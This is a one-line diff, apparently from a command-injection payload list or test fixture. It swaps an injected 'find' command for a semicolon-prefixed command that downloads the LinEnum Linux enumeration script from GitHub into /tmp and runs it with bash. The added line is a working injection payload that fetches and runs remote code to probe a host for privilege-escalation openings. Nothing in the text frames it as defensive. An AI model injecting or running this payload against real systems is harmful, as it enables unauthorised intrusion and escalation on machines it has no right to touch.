@@ -1,1 +1,1 @@
-; find / -name config
+; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh >　/tmp/LinEnum.sh ; bash /tmp/LinEnum.sh ;
